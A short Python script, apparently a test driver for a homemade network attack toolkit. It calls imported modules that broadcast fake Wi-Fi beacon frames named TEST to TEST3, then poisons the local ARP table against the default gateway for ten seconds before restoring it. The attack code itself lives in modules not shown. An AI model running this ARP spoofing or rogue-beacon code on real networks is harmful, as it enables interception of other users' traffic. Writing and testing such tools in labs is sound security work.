import gen_utils as gu
import arp
import beacon
import time
arp_attack = arp.Arp_poison(gu.get_pub_ip(), gu.get_default_gateway())

mybeacon = beacon.Beacon()

mybeacon.send(ssid="TEST", enc = True)
mybeacon.send(ssid="TEST1", enc = False)
mybeacon.send(ssid="TEST2", enc = True)
mybeacon.send(ssid="TEST3")
mybeacon.list()
mybeacon.stop()
mybeacon.list()
time.sleep(5)
mybeacon.stop_all()
arp_attack.poison_arp_table()
time.sleep(10)
arp_attack.restore_arp_table()
